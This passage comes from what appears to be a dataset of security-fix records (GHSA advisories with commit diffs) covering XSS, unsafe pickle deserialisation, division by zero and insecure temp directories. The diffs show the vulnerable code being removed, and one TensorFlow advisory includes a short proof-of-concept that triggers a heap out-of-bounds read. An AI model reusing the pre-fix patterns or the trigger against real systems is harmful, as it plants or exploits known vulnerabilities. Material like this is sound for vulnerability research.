attack.","published_date":"2019-04-22","chain_len":1,"project":"https:\/\/github.com\/arrow-kt\/arrow","commit_href":"https:\/\/github.com\/arrow-kt\/arrow\/commit\/74198dab522393487d5344f194dc21208ab71ae8","commit_sha":"74198dab522393487d5344f194dc21208ab71ae8","patch":"SINGLE","chain_ord":"['74198dab522393487d5344f194dc21208ab71ae8']","before_first_fix_commit":"{'b78924304193c4301b1c0a6cc0c253f105ed0a15'}","last_fix_commit":"74198dab522393487d5344f194dc21208ab71ae8","chain_ord_pos":1.0,"commit_datetime":"02\/19\/2019, 17:11:32","message":"Fix some http vulnerabilities","author":"Paco","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'build.gradle': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/arrow-kt\/arrow\/raw\/74198dab522393487d5344f194dc21208ab71ae8\/build.gradle', 'patch': '@@ -39,7 +39,7 @@ buildscript {\\n             url \"https:\/\/plugins.gradle.org\/m2\/\"\\n         }\\n         jcenter()\\n-        maven { url \"http:\/\/dl.bintray.com\/kotlin\/kotlin-dev\" }\\n+        maven { url \"https:\/\/dl.bintray.com\/kotlin\/kotlin-dev\" }\\n         maven { url \"https:\/\/dl.bintray.com\/jetbrains\/markdown\/\" }\\n         maven { url \"https:\/\/dl.bintray.com\/arrow-kt\/arrow-kt\/\" }\\n     }\\n@@ -69,8 +69,8 @@ allprojects {\\n     repositories {\\n         jcenter()\\n         maven { url \\'https:\/\/kotlin.bintray.com\/kotlinx\\' }\\n-        maven { url \"http:\/\/dl.bintray.com\/kotlin\/kotlin-dev\" }\\n-        maven { url \"http:\/\/dl.bintray.com\/arrow-kt\/arrow-kt\" }\\n+        maven { url \"https:\/\/dl.bintray.com\/kotlin\/kotlin-dev\" }\\n+        maven { url \"https:\/\/dl.bintray.com\/arrow-kt\/arrow-kt\" }\\n         maven { url \"https:\/\/dl.bintray.com\/jetbrains\/markdown\/\" }\\n     }\\n }\\n@@ -252,4 +252,4 @@ dependencyUpdates {\\n \\n task checkDependenciesVersion {\\n     dependsOn dependencyUpdates\\n-}\\n\\\\ No newline at end of file\\n+}'}}","message_norm":"fix some http vulnerabilities","language":"sv","entities":"[('fix', 'ACTION', ''), ('vulnerabilities', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['build.gradle'])","num_files":1.0},{"index":2919,"vuln_id":"GHSA-rcjj-h6gh-jf3r","cwe_id":"{'CWE-379'}","score":5.5,"chain":"{'https:\/\/github.com\/apache\/groovy\/commit\/bcbe5c4c76db83736166530647c024ac1e47ef28'}","dataset":"osv","summary":"Information Disclosure in Apache Groovy Apache Groovy provides extension methods to aid with creating temporary directories. Prior to this fix, Groovy's implementation of those extension methods was using a now superseded Java JDK method call that is potentially not secure on some operating systems in some contexts. Users not using the extension methods mentioned in the advisory are not affected, but may wish to read the advisory for further details. Versions Affected: 2.0 to 2.4.20, 2.5.0 to 2.5.13, 3.0.0 to 3.0.6, and 4.0.0-alpha-1. Fixed in versions 2.4.21, 2.5.14, 3.0.7, 4.0.0-alpha-2.","published_date":"2020-12-09","chain_len":1,"project":"https:\/\/github.com\/apache\/groovy","commit_href":"https:\/\/github.com\/apache\/groovy\/commit\/bcbe5c4c76db83736166530647c024ac1e47ef28","commit_sha":"bcbe5c4c76db83736166530647c024ac1e47ef28","patch":"SINGLE","chain_ord":"['bcbe5c4c76db83736166530647c024ac1e47ef28']","before_first_fix_commit":"{'e5aabb3a88974a6176a0fe76356c6a0415b5d183'}","last_fix_commit":"bcbe5c4c76db83736166530647c024ac1e47ef28","chain_ord_pos":1.0,"commit_datetime":"11\/18\/2020, 13:08:16","message":"GROOVY-9824: replace some old api usage with newer available variants (closes #1425)","author":"Paul King","comments":null,"stats":"{'additions': 14, 'deletions': 33, 'total': 47}","files":"{'src\/main\/java\/org\/codehaus\/groovy\/runtime\/DefaultGroovyStaticMethods.java': {'additions': 14, 'deletions': 33, 'changes': 47, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/groovy\/raw\/bcbe5c4c76db83736166530647c024ac1e47ef28\/src%2Fmain%2Fjava%2Forg%2Fcodehaus%2Fgroovy%2Fruntime%2FDefaultGroovyStaticMethods.java', 'patch': '@@ -27,6 +27,8 @@\\n import java.lang.management.ManagementFactory;\\n import java.lang.management.ThreadInfo;\\n import java.lang.management.ThreadMXBean;\\n+import java.nio.file.Files;\\n+import java.nio.file.Path;\\n import java.util.Arrays;\\n import java.util.Locale;\\n import java.util.ResourceBundle;\\n@@ -211,42 +213,21 @@ public static ResourceBundle getBundle(ResourceBundle self, String bundleName, L\\n     }\\n \\n     public static File createTempDir(File self) throws IOException {\\n-        return createTempDir(self, \"groovy-generated-\", \"-tmpdir\");\\n+        return createTempDir(self, \"groovy-generated-\", \"tmpdir-\");\\n+    }\\n+\\n+    public static File createTempDir(File self, final String prefix) throws IOException {\\n+        return createTempDirNio(prefix);\\n     }\\n \\n     public static File createTempDir(File self, final String prefix, final String suffix) throws IOException {\\n-        final int MAXTRIES = 3;\\n-        int accessDeniedCounter = 0;\\n-        File tempFile=null;\\n-        for (int i=0; i<MAXTRIES; i++) {\\n-            try {\\n-                tempFile = File.createTempFile(prefix, suffix);\\n-                tempFile.delete();\\n-                tempFile.mkdirs();\\n-                break;\\n-            } catch (IOException ioe) {\\n-                if (ioe.getMessage().startsWith(\"Access is denied\")) {\\n-                    accessDeniedCounter++;\\n-                    try {\\n-                        Thread.sleep(100);\\n-                    } catch (InterruptedException ignore) {\\n-                    }\\n-                }\\n-                if (i == MAXTRIES - 1) {\\n-                    if (accessDeniedCounter == MAXTRIES) {\\n-                        String msg = \"Access is denied.\\\\nWe tried \" + accessDeniedCounter +\\n-                                \" times to create a temporary directory and failed each time.\" +\\n-                                \" If you are on Windows, you are possibly victim to\" +\\n-                                \" http:\/\/bugs.sun.com\/bugdatabase\/view_bug.do?bug_id=6325169.\" +\\n-                                \" This is not a bug in Groovy.\";\\n-                        throw new IOException(msg);\\n-                    } else {\\n-                        throw ioe;\\n-                    }\\n-                }\\n-            }\\n-        }\\n-        return tempFile;\\n+        \/\/ more secure Files api doesn\\'t support suffix, so just append it to the prefix\\n+        return createTempDirNio(prefix + suffix);\\n+    }\\n+\\n+    private static File createTempDirNio(String prefix) throws IOException {\\n+        Path tempPath = Files.createTempDirectory(prefix);\\n+        return tempPath.toFile();\\n     }\\n \\n     \/**'}}","message_norm":"groovy-9824: replace some old api usage with newer available variants (closes #1425)","language":"en","entities":"[('#1425', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/org\/codehaus\/groovy\/runtime\/DefaultGroovyStaticMethods.java'])","num_files":1.0},{"index":2921,"vuln_id":"GHSA-rcvx-rmvf-mxch","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/eclipse\/hawkbit\/commit\/94b7c12cde1b38eda5414bd88d6d068008cfb9f9'}","dataset":"osv","summary":"Cross-site Scripting in Eclipse Hawkbit In all version of Eclipse Hawkbit prior to 0.3.0M7, the HTTP 404 (Not Found) JSON response body returned by the REST API may contain unsafe characters within the path attribute. Sending a POST request to a non existing resource will return the full path from the given URL unescaped to the client.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/eclipse\/hawkbit","commit_href":"https:\/\/github.com\/eclipse\/hawkbit\/commit\/94b7c12cde1b38eda5414bd88d6d068008cfb9f9","commit_sha":"94b7c12cde1b38eda5414bd88d6d068008cfb9f9","patch":"SINGLE","chain_ord":"['94b7c12cde1b38eda5414bd88d6d068008cfb9f9']","before_first_fix_commit":"{'8816396d18880d2020743ce2e83a08446449d0db'}","last_fix_commit":"94b7c12cde1b38eda5414bd88d6d068008cfb9f9","chain_ord_pos":1.0,"commit_datetime":"01\/12\/2021, 10:56:44","message":"Fixes #1067\n\nJSON body response for HTTP 404 error may contain unsafe URL path characters. Thus removing path from the response\n\nSigned-off-by: Dominic Schabel <dominic.schabel@bosch.io>","author":"Dominic Schabel","comments":null,"stats":"{'additions': 22, 'deletions': 4, 'total': 26}","files":"{'hawkbit-runtime\/hawkbit-update-server\/src\/main\/java\/org\/eclipse\/hawkbit\/app\/ErrorController.java': {'additions': 22, 'deletions': 4, 'changes': 26, 'status': 'renamed', 'raw_url': 'https:\/\/github.com\/eclipse\/hawkbit\/raw\/94b7c12cde1b38eda5414bd88d6d068008cfb9f9\/hawkbit-runtime%2Fhawkbit-update-server%2Fsrc%2Fmain%2Fjava%2Forg%2Feclipse%2Fhawkbit%2Fapp%2FErrorController.java', 'patch': '@@ -8,6 +8,8 @@\\n  *\/\\n package org.eclipse.hawkbit.app;\\n \\n+import java.util.Map;\\n+\\n import javax.servlet.http.HttpServletRequest;\\n import javax.servlet.http.HttpServletResponse;\\n \\n@@ -23,22 +25,23 @@\\n \/**\\n  * Error page controller that ensures that ocet stream does not return text in\\n  * case of an error.\\n- *\\n  *\/\\n @Controller\\n \/\/ Exception squid:S3752 - errors need handling for all methods\\n @SuppressWarnings(\"squid:S3752\")\\n-public class StreamAwareErrorController extends BasicErrorController {\\n+public class ErrorController extends BasicErrorController {\\n+\\n+    private static final String PATH = \"path\";\\n \\n     \/**\\n-     * A new {@link StreamAwareErrorController}.\\n+     * A new {@link ErrorController}.\\n      * \\n      * @param errorAttributes\\n      *            the error attributes\\n      * @param serverProperties\\n      *            configuration properties\\n      *\/\\n-    public StreamAwareErrorController(final ErrorAttributes errorAttributes, final ServerProperties serverProperties) {\\n+    public ErrorController(final ErrorAttributes errorAttributes, final ServerProperties serverProperties) {\\n         super(errorAttributes, serverProperties.getError());\\n     }\\n \\n@@ -48,4 +51,19 @@ public ResponseEntity<Void> errorStream(final HttpServletRequest request, final\\n         return new ResponseEntity<>(status);\\n     }\\n \\n+    @Override\\n+    @RequestMapping\\n+    public ResponseEntity<Map<String, Object>> error(final HttpServletRequest request) {\\n+        final HttpStatus status = getStatus(request);\\n+        final Map<String, Object> body = getErrorAttributesWithoutPath(request);\\n+        return new ResponseEntity<>(body, status);\\n+    }\\n+\\n+    private Map<String, Object> getErrorAttributesWithoutPath(final HttpServletRequest request) {\\n+        final Map<String, Object> body = getErrorAttributes(request, isIncludeStackTrace(request, MediaType.ALL));\\n+        if (body != null && body.containsKey(PATH)) {\\n+            body.remove(PATH);\\n+        }\\n+        return body;\\n+    }\\n }'}}","message_norm":"fixes #1067\n\njson body response for http 404 error may contain unsafe url path characters. thus removing path from the response\n\nsigned-off-by: dominic schabel <dominic.schabel@bosch.io>","language":"en","entities":"[('fixes', 'ACTION', ''), ('#1067', 'ISSUE', ''), ('error', 'FLAW', ''), ('unsafe', 'SECWORD', ''), ('removing', 'ACTION', ''), ('dominic.schabel@bosch.io', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['hawkbit-runtime\/hawkbit-update-server\/src\/main\/java\/org\/eclipse\/hawkbit\/app\/ErrorController.java'])","num_files":1.0},{"index":2923,"vuln_id":"GHSA-rcxc-3w2m-mp8h","cwe_id":"{'CWE-502'}","score":9.8,"chain":"{'https:\/\/github.com\/NVIDIA\/NVFlare\/commit\/fd018eea9dff925a765079a94c2f017920fcda67'}","dataset":"osv","summary":"Unsafe deserialisation in the PKI implementation scheme of NVFlare ### Impact\nNVFLARE contains a vulnerability in its PKI implementation module, where The CA credentials are transported via pickle and no safe deserialization. The deserialization of Untrusted Data may allow an unprivileged network attacker to cause Remote Code Execution, Denial Of Service, and Impact to both Confidentiality and Integrity.\nAll versions before 2.1.2 are affected.\n\nCVSS Score = 9.8\n[AV:N\/AC:L\/PR:N\/UI:N\/S:U\/C:H\/I:H\/A:H](https:\/\/nam11.safelinks.protection.outlook.com\/?url=https%3A%2F%2Fnvd.nist.gov%2Fvuln-metrics%2Fcvss%2Fv3-calculator%3Fvector%3DAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AH&data=05%7C01%7Cchesterc%40nvidia.com%7Ce9600bde16854b0b380008da4fc544f7%7C43083d15727340c1b7db39efd9ccc17a%7C0%7C0%7C637910005925574215%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=5kBrXEmAbqp8R31JCH%2FG95MUly72UPVihnBwiRFmvBY%3D&reserved=0)\n\n\n\n### Patches\nThe patch will be included in nvflare==2.1.2\n\n### Workarounds\nReplace pickle serialization with JSON and change the code accordingly\n\nAdditional information\nIssue Found by: Oliver Sellwood (@Nintorac)","published_date":"2022-06-22","chain_len":1,"project":"https:\/\/github.com\/NVIDIA\/NVFlare","commit_href":"https:\/\/github.com\/NVIDIA\/NVFlare\/commit\/fd018eea9dff925a765079a94c2f017920fcda67","commit_sha":"fd018eea9dff925a765079a94c2f017920fcda67","patch":"SINGLE","chain_ord":"['fd018eea9dff925a765079a94c2f017920fcda67']","before_first_fix_commit":"{'f0a005982122277a1ac22cb04f977186393d8ab2'}","last_fix_commit":"fd018eea9dff925a765079a94c2f017920fcda67","chain_ord_pos":1.0,"commit_datetime":"04\/19\/2022, 15:30:59","message":"Replace pickle in state persistence in provision cert with json (#412)","author":"Isaac Yang","comments":null,"stats":"{'additions': 17, 'deletions': 13, 'total': 30}","files":"{'nvflare\/lighter\/impl\/cert.py': {'additions': 17, 'deletions': 13, 'changes': 30, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/NVIDIA\/NVFlare\/raw\/fd018eea9dff925a765079a94c2f017920fcda67\/nvflare%2Flighter%2Fimpl%2Fcert.py', 'patch': '@@ -13,8 +13,8 @@\\n # limitations under the License.\\n \\n import datetime\\n+import json\\n import os\\n-import pickle\\n \\n from cryptography import x509\\n from cryptography.hazmat.backends import default_backend\\n@@ -50,13 +50,13 @@ def __init__(self):\\n \\n     def initialize(self, ctx):\\n         state_dir = self.get_state_dir(ctx)\\n-        cert_file = os.path.join(state_dir, \"cert.pkl\")\\n+        cert_file = os.path.join(state_dir, \"cert.json\")\\n         if os.path.exists(cert_file):\\n-            self.persistent_state = pickle.load(open(cert_file, \"rb\"))\\n-            self.serialized_cert = self.persistent_state[\"root_cert\"]\\n+            self.persistent_state = json.load(open(cert_file, \"rt\"))\\n+            self.serialized_cert = self.persistent_state[\"root_cert\"].encode(\"ascii\")\\n             self.root_cert = x509.load_pem_x509_certificate(self.serialized_cert, default_backend())\\n             self.pri_key = serialization.load_pem_private_key(\\n-                self.persistent_state[\"root_pri_key\"], password=None, backend=default_backend()\\n+                self.persistent_state[\"root_pri_key\"].encode(\"ascii\"), password=None, backend=default_backend()\\n             )\\n             self.pub_key = self.pri_key.public_key()\\n             self.subject = self.root_cert.subject\\n@@ -69,26 +69,30 @@ def _build_root(self, subject):\\n             self.pri_key = pri_key\\n             self.pub_key = pub_key\\n             self.serialized_cert = serialize_cert(self.root_cert)\\n-            self.persistent_state[\"root_cert\"] = self.serialized_cert\\n-            self.persistent_state[\"root_pri_key\"] = serialize_pri_key(self.pri_key)\\n+            self.persistent_state[\"root_cert\"] = self.serialized_cert.decode(\"ascii\")\\n+            self.persistent_state[\"root_pri_key\"] = serialize_pri_key(self.pri_key).decode(\"ascii\")\\n \\n     def _build_write_cert_pair(self, participant, base_name, ctx):\\n         subject = participant.subject\\n         if self.persistent_state and subject in self.persistent_state:\\n-            cert = x509.load_pem_x509_certificate(self.persistent_state[subject][\"cert\"], default_backend())\\n+            cert = x509.load_pem_x509_certificate(\\n+                self.persistent_state[subject][\"cert\"].encode(\"ascii\"), default_backend()\\n+            )\\n             pri_key = serialization.load_pem_private_key(\\n-                self.persistent_state[subject][\"pri_key\"], password=None, backend=default_backend()\\n+                self.persistent_state[subject][\"pri_key\"].encode(\"ascii\"), password=None, backend=default_backend()\\n             )\\n         else:\\n             pri_key, cert = self.get_pri_key_cert(participant)\\n-            self.persistent_state[subject] = dict(cert=serialize_cert(cert), pri_key=serialize_pri_key(pri_key))\\n+            self.persistent_state[subject] = dict(\\n+                cert=serialize_cert(cert).decode(\"ascii\"), pri_key=serialize_pri_key(pri_key).decode(\"ascii\")\\n+            )\\n         dest_dir = self.get_kit_dir(participant, ctx)\\n         with open(os.path.join(dest_dir, f\"{base_name}.crt\"), \"wb\") as f:\\n             f.write(serialize_cert(cert))\\n         with open(os.path.join(dest_dir, f\"{base_name}.key\"), \"wb\") as f:\\n             f.write(serialize_pri_key(pri_key))\\n         pkcs12 = serialization.pkcs12.serialize_key_and_certificates(\\n-            subject.encode(\"utf-8\"), pri_key, cert, None, serialization.BestAvailableEncryption(subject.encode(\"utf-8\"))\\n+            subject.encode(\"ascii\"), pri_key, cert, None, serialization.BestAvailableEncryption(subject.encode(\"ascii\"))\\n         )\\n         with open(os.path.join(dest_dir, f\"{base_name}.pfx\"), \"wb\") as f:\\n             f.write(pkcs12)\\n@@ -163,5 +167,5 @@ def _x509_name(self, cn_name, org_name=None):\\n \\n     def finalize(self, ctx):\\n         state_dir = self.get_state_dir(ctx)\\n-        cert_file = os.path.join(state_dir, \"cert.pkl\")\\n-        pickle.dump(self.persistent_state, open(cert_file, \"wb\"))\\n+        cert_file = os.path.join(state_dir, \"cert.json\")\\n+        json.dump(self.persistent_state, open(cert_file, \"wt\"))'}}","message_norm":"replace pickle in state persistence in provision cert with json (#412)","language":"en","entities":"[('#412', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['nvflare\/lighter\/impl\/cert.py'])","num_files":1.0},{"index":2924,"vuln_id":"GHSA-rf3h-xgv5-2q39","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/cbda3c6b2dbbd3fbdc482ff8c0170a78ec2e97d0'}","dataset":"osv","summary":"Division by zero in TFLite's implementation of `DepthwiseConv` ### Impact\nThe implementation of the `DepthwiseConv` TFLite operator is [vulnerable to a division by zero error](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/1a8e885b864c818198a5b2c0cbbeca5a1e833bc8\/tensorflow\/lite\/kernels\/depthwise_conv.cc#L287-L288):\n\n```cc\nint num_input_channels = SizeOfDimension(input, 3);\nTF_LITE_ENSURE_EQ(context, num_filter_channels % num_input_channels, 0);\n```\n\nAn attacker can craft a model such that `input`'s fourth dimension would be 0.\n\n### Patches\nWe have patched the issue in GitHub commit [cbda3c6b2dbbd3fbdc482ff8c0170a78ec2e97d0](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/cbda3c6b2dbbd3fbdc482ff8c0170a78ec2e97d0).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/cbda3c6b2dbbd3fbdc482ff8c0170a78ec2e97d0","commit_sha":"cbda3c6b2dbbd3fbdc482ff8c0170a78ec2e97d0","patch":"SINGLE","chain_ord":"['cbda3c6b2dbbd3fbdc482ff8c0170a78ec2e97d0']","before_first_fix_commit":"{'1a8e885b864c818198a5b2c0cbbeca5a1e833bc8'}","last_fix_commit":"cbda3c6b2dbbd3fbdc482ff8c0170a78ec2e97d0","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 22:53:48","message":"Prevent divisions by 0\n\nPiperOrigin-RevId: 371003153\nChange-Id: Idef56c95b9fcaeb97f87e18c7a674dbeb5173204","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 2, 'total': 5}","files":"{'tensorflow\/lite\/kernels\/depthwise_conv.cc': {'additions': 3, 'deletions': 2, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/cbda3c6b2dbbd3fbdc482ff8c0170a78ec2e97d0\/tensorflow%2Flite%2Fkernels%2Fdepthwise_conv.cc', 'patch': '@@ -285,8 +285,8 @@ TfLiteStatus ComputeDepthMultiplier(TfLiteContext* context,\\n                                     int16* depth_multiplier) {\\n   int num_filter_channels = SizeOfDimension(filter, 3);\\n   int num_input_channels = SizeOfDimension(input, 3);\\n+  TF_LITE_ENSURE(context, num_input_channels != 0);\\n   TF_LITE_ENSURE_EQ(context, num_filter_channels % num_input_channels, 0);\\n-\\n   *depth_multiplier = num_filter_channels \/ num_input_channels;\\n   return kTfLiteOk;\\n }\\n@@ -455,8 +455,9 @@ TfLiteStatus EvalHybridPerChannel(TfLiteContext* context, TfLiteNode* node,\\n   float output_activation_min, output_activation_max;\\n   CalculateActivationRange(params->activation, &output_activation_min,\\n                            &output_activation_max);\\n-  const int input_size = NumElements(input) \/ SizeOfDimension(input, 0);\\n   const int batch_size = SizeOfDimension(input, 0);\\n+  TF_LITE_ENSURE(context, batch_size != 0);\\n+  const int input_size = NumElements(input) \/ batch_size;\\n   TfLiteTensor* input_quantized;\\n   TF_LITE_ENSURE_OK(context,\\n                     GetTemporarySafe(context, node, data->input_quantized_index,'}}","message_norm":"prevent divisions by 0\n\npiperorigin-revid: 371003153\nchange-id: idef56c95b9fcaeb97f87e18c7a674dbeb5173204","language":"en","entities":"[('prevent', 'ACTION', ''), ('divisions by 0', 'SECWORD', ''), ('371003153', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/depthwise_conv.cc'])","num_files":1.0},{"index":2928,"vuln_id":"GHSA-rf66-hmqf-q3fc","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/snipe\/snipe-it\/pull\/6831\/commits\/5848d9a10c7d62c73ff6a3858edfae96a429402a'}","dataset":"osv","summary":"Improper Neutralization of Input During Web Page Generation in Select2 In Select2 through 4.0.5, as used in Snipe-IT and other products, rich selectlists allow XSS. This affects use cases with Ajax remote data loading when HTML templates are used to display listbox data.","published_date":"2022-05-14","chain_len":1,"project":"https:\/\/github.com\/snipe\/snipe-it","commit_href":"https:\/\/github.com\/snipe\/snipe-it\/pull\/6831\/commits\/5848d9a10c7d62c73ff6a3858edfae96a429402a","commit_sha":"5848d9a10c7d62c73ff6a3858edfae96a429402a","patch":"SINGLE","chain_ord":"['5848d9a10c7d62c73ff6a3858edfae96a429402a']","before_first_fix_commit":"{'bd8548325d6b4210015bd0ddeb144c61ae8949be'}","last_fix_commit":"5848d9a10c7d62c73ff6a3858edfae96a429402a","chain_ord_pos":1.0,"commit_datetime":"03\/19\/2019, 02:29:30","message":"Janky fix for Select2 bug","author":"snipe","comments":null,"stats":"{'additions': 12, 'deletions': 1, 'total': 13}","files":"{'resources\/assets\/js\/snipeit.js': {'additions': 12, 'deletions': 1, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/snipe\/snipe-it\/raw\/5848d9a10c7d62c73ff6a3858edfae96a429402a\/resources%2Fassets%2Fjs%2Fsnipeit.js', 'patch': '@@ -260,7 +260,18 @@ $(document).ready(function () {\\n     }\\n \\n     function formatDataSelection (datalist) {\\n-        return datalist.text;\\n+        \/\/ This a heinous workaround for a known bug in Select2.\\n+        \/\/ Without this, the rich selectlists are vulnerable to XSS.\\n+        \/\/ Many thanks to @uberbrady for this fix. It ain\\'t pretty,\\n+        \/\/ but it resolves the issue until Select2 addresses it on their end.\\n+        \/\/\\n+        \/\/ Bug was reported in 2016 :{\\n+        \/\/ https:\/\/github.com\/select2\/select2\/issues\/4587\\n+\\n+        return datalist.text.replace(\/>\/g, \\'&gt;\\')\\n+            .replace(\/<\/g, \\'&lt;\\')\\n+            .replace(\/\"\/g, \\'&quot;\\')\\n+            .replace(\/\\'\/g, \\'&#039;\\');\\n     }\\n \\n     \/\/ This handles the radio button selectors for the checkout-to-foo options'}}","message_norm":"janky fix for select2 bug","language":"en","entities":"[('bug', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['resources\/assets\/js\/snipeit.js'])","num_files":1.0},{"index":2935,"vuln_id":"GHSA-rfw2-x9f8-2f6m","cwe_id":"{'CWE-79'}","score":0.0,"chain":"{'https:\/\/github.com\/linkedin\/oncall\/commit\/843bc106a1c1b1699e9e52b6b0d01c7efe1d6225'}","dataset":"osv","summary":"Cross-Site Scripting LinkedIn Oncall through 1.4.0 allows reflected XSS via \/query because of mishandling of the \"No results found for\" message in the search bar.","published_date":"2021-04-30","chain_len":1,"project":"https:\/\/github.com\/linkedin\/oncall","commit_href":"https:\/\/github.com\/linkedin\/oncall\/commit\/843bc106a1c1b1699e9e52b6b0d01c7efe1d6225","commit_sha":"843bc106a1c1b1699e9e52b6b0d01c7efe1d6225","patch":"SINGLE","chain_ord":"['843bc106a1c1b1699e9e52b6b0d01c7efe1d6225']","before_first_fix_commit":"{'605d10ef5d68181b2c516dc857fdc3c8575539cd'}","last_fix_commit":"843bc106a1c1b1699e9e52b6b0d01c7efe1d6225","chain_ord_pos":1.0,"commit_datetime":"02\/05\/2021, 23:30:43","message":"prevent potential XSS from searchbar results (#342)\n\n* prevent potential XSS from searchbar results\r\n\r\n* use built in handlebars expression escaping\r\n\r\n* use handlebars encodeURIComponent","author":"Diego Cepeda","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'src\/oncall\/ui\/static\/js\/oncall.js': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/linkedin\/oncall\/raw\/843bc106a1c1b1699e9e52b6b0d01c7efe1d6225\/src%2Foncall%2Fui%2Fstatic%2Fjs%2Foncall.js', 'patch': '@@ -579,11 +579,11 @@ var oncall = {\\n               },\\n               footer: function(resp){\\n                 if (teamsCt > typeaheadLimit) {\\n-                  return \\'<div class=\"tt-see-all\"><a href=\"\/query\/\\' + resp.query + \\'\/teams\" data-navigo> See all \\' + teamsCt + \\' results for teams \u00bb<\/a><\/div>\\';\\n+                  return \\'<div class=\"tt-see-all\"><a href=\"\/query\/\\' + Handlebars.escapeExpression(encodeURIComponent(resp.query)) + \\'\/teams\" data-navigo> See all \\' + teamsCt + \\' results for teams \u00bb<\/a><\/div>\\';\\n                 }\\n               },\\n               empty: function(resp){\\n-                return \\'<h4> No results found for \"\\' + resp.query + \\'\" <\/h4>\\';\\n+                return \\'<h4> No results found for \"\\' + Handlebars.escapeExpression(resp.query) + \\'\" <\/h4>\\';\\n               }\\n             }\\n           },\\n@@ -604,7 +604,7 @@ var oncall = {\\n               },\\n               footer: function(resp){\\n                 if (servicesCt > typeaheadLimit) {\\n-                  return \\'<div class=\"tt-see-all\"><a href=\"\/query\/\\' + resp.query + \\'\/services\" data-navigo> See all \\' + servicesCt + \\' results for services \u00bb<\/a><\/div>\\';\\n+                  return \\'<div class=\"tt-see-all\"><a href=\"\/query\/\\' + Handlebars.escapeExpression(encodeURIComponent(resp.query)) + \\'\/services\" data-navigo> See all \\' + servicesCt + \\' results for services \u00bb<\/a><\/div>\\';\\n                 }\\n               }\\n             }\\n@@ -626,7 +626,7 @@ var oncall = {\\n               },\\n               footer: function(resp){\\n                 if (usersCt > typeaheadLimit) {\\n-                  return \\'<div class=\"tt-see-all\"><a href=\"\/query\/\\' + resp.query + \\'\/users\" data-navigo> See all \\' + usersCt + \\' results for users \u00bb<\/a><\/div>\\';\\n+                  return \\'<div class=\"tt-see-all\"><a href=\"\/query\/\\' + Handlebars.escapeExpression(encodeURIComponent(resp.query)) + \\'\/users\" data-navigo> See all \\' + usersCt + \\' results for users \u00bb<\/a><\/div>\\';\\n                 }\\n               }\\n             }'}}","message_norm":"prevent potential xss from searchbar results (#342)\n\n* prevent potential xss from searchbar results\r\n\r\n* use built in handlebars expression escaping\r\n\r\n* use handlebars encodeuricomponent","language":"en","entities":"[('prevent', 'ACTION', ''), ('xss', 'SECWORD', ''), ('#342', 'ISSUE', ''), ('prevent', 'ACTION', ''), ('xss', 'SECWORD', ''), ('escaping', 'SECWORD', ''), ('encodeuricomponent', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/oncall\/ui\/static\/js\/oncall.js'])","num_files":1.0},{"index":2937,"vuln_id":"GHSA-rg3m-hqc5-344v","cwe_id":"{'CWE-125'}","score":7.1,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/67bfd9feeecfb3c61d80f0e46d89c170fbee682b'}","dataset":"osv","summary":"`SparseFillEmptyRows` heap OOB ### Impact\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/e71b86d47f8bc1816bf54d7bddc4170e47670b97\/tensorflow\/core\/kernels\/sparse_fill_empty_rows_op.cc#L194-L241) of `SparseFillEmptyRows` can be made to trigger a heap OOB access:\n\n```python\nimport tensorflow as tf\n  \ndata=tf.raw_ops.SparseFillEmptyRows(\n  indices=[[0,0],[0,0],[0,0]],\n  values=['sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss'],\n  dense_shape=[5,3],\n  default_value='o')\n```\n  \nThis occurs whenever the size of `indices` does not match the size of `values`.\n\n### Patches\nWe have patched the issue in GitHub commit [67bfd9feeecfb3c61d80f0e46d89c170fbee682b](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/67bfd9feeecfb3c61d80f0e46d89c170fbee682b).\n\nThe fix will be included in TensorFlow 